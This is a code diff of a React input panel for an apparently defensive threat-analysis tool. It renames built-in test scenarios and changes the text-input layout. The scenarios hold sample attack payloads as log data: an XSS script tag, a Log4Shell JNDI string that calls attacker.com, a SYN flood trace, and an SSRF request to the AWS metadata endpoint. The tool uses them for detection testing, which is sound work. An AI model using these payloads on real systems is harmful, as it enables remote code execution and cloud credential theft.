@@ -11,25 +11,25 @@ const INPUT_TYPES = [
 const TEST_SCENARIOS = [
   {
     id: 'xss-waf',
-    name: 'WAF Bypass (XSS)',
+    name: 'XSS Test',
     type: 'log',
     content: `<134>Mar 24 07:30:01 TWIN ASM: uri="/search?q=<script>alert(document.domain)</script>" request_status="passed" violation_rating="5" staged_sig_names="XSS script tag (URI)" method="GET" response_code="200" ip_client="193.17.57.100"`
   },
   {
     id: 'log4shell',
-    name: 'Log4Shell (RCE)',
+    name: 'Log4Shell Test',
     type: 'log',
     content: `2026-03-24 10:15:22 ERROR [App] User-Agent: \${jndi:ldap://attacker.com/Exploit}\nException in thread "main" java.lang.NullPointerException`
   },
   {
     id: 'network-scan',
-    name: 'SYN Flood',
+    name: 'Network SYN',
     type: 'network',
     content: `10.0.0.5 -> 192.168.1.100 TCP SYN\n10.0.0.5 -> 192.168.1.100 TCP SYN\n10.0.0.5 -> 192.168.1.100 TCP SYN\n10.0.0.5 -> 192.168.1.100 TCP SYN`
   },
   {
     id: 'ssrf',
-    name: 'AWS SSRF',
+    name: 'SSRF Test',
     type: 'log',
     content: `GET /webhook?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: api.internal.corp`
   },
@@ -123,7 +123,7 @@ export default function InputPanel({ onAnalyze, isLoading }) {
       </div>
 
       {/* File Upload Zone */}
-      {(inputType === 'file') && (
+      {(inputType === 'file' || inputType === 'log') && (
         <>
           <div
             className={`file-drop-zone ${dragging ? 'dragging' : ''}`}
@@ -153,18 +153,16 @@ export default function InputPanel({ onAnalyze, isLoading }) {
       )}
 
       {/* Text Input */}
-      {inputType !== 'file' && (
-        <textarea
-          className="text-input"
-          placeholder={placeholders[inputType]}
-          value={content}
-          onChange={(e) => setContent(e.target.value)}
-        />
-      )}
+      <textarea
+        className="text-input"
+        placeholder={placeholders[inputType]}
+        value={content}
+        onChange={(e) => setContent(e.target.value)}
+      />
 
       {/* Test Scenarios */}
       <div className="test-scenarios">
-        <div style={{ fontSize: '0.65rem', opacity: 0.6, marginBottom: '8px', textTransform: 'uppercase', letterSpacing: '0.1em', fontWeight: 700 }}>Inject Threat Telemetry:</div>
+        <div style={{ fontSize: '0.65rem', opacity: 0.6, marginBottom: '8px', textTransform: 'uppercase', letterSpacing: '0.1em', fontWeight: 700 }}>Test Scenarios:</div>
         <div className="scenario-grid">
           {TEST_SCENARIOS.map((s) => (
             <button
